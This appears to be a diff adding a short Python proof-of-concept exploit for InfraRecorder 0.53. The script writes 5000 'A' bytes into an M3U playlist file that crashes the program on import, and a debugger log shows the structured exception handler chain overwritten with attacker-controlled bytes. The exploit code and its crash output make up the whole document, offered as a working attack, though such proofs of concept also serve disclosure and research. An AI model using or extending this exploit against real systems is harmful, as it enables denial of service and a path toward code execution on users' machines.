@@ -1,0 +1,42 @@
+###########################################################
+[~] Exploit Title: InfraRecorder  Memory Corruption Exploit [DOS]
+[~] Author: sajith
+[~] version: version 0.53
+[~] vulnerable app link:
+http://sourceforge.net/projects/infrarecorder/files/InfraRecorder/0.53/ir053.exe/download
+[~]Tested in windows Xp sp3,english
+###########################################################
+
+raw_input("hit enter to fuzz")
+
+print "poc by sajith shetty"
+
+try:
+	f = open("test.m3u","w")
+	junk = "\x41" * 5000
+	f.write(junk)
+	print "done"
+except Exception, e:
+	print "[+]error - " + str(e)
+
+
+
+#edit > import > test.m3u
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=00157980 ebx=00b60000 ecx=108b1175 edx=00410041 esi=00410039
+edi=00000113
+#eip=7c910efe esp=0012c828 ebp=0012ca48 iopl=0         nv up ei pl zr na pe
+nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
+efl=00010246
+#ntdll!wcsncpy+0x99f:
+#7c910efe 8b39            mov     edi,dword ptr [ecx]
+ ds:0023:108b1175=????????
+#0:000> !exchain
+#0012ca38: ntdll!strchr+113 (7c90e900)
+#0012cab8: *** ERROR: Module load completed but symbols could not be loaded
+for C:\Program Files\InfraRecorder\infrarecorder.exe
+#infrarecorder+ba5b0 (004ba5b0)
+#0012d07c: infrarecorder+10041 (00410041)
+#Invalid exception stack at 00410041
